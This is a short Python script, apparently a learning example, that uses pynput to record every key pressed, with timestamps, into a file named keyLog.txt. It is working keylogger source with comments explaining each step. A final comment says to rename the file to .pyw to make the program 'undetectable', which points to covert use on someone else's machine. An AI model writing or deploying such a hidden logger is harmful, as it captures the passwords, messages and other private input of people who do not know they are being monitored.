from pynput.keyboard import Listener
import logging as log
#logging is a means of tracking events that happen when some software runs.

#To format the config file of log
log.basicConfig(
    filename='keyLog.txt',
    level = log.DEBUG,
    #DEBUG is Detailed information.
    format='%(asctime)s - %(message)s'
)
def onPressed(key):
    #Registered info of the key
    log.info(str(key))

with Listener(on_press=onPressed) as listener:
    listener.join()


#To make this program undetectable change .py to .pyw
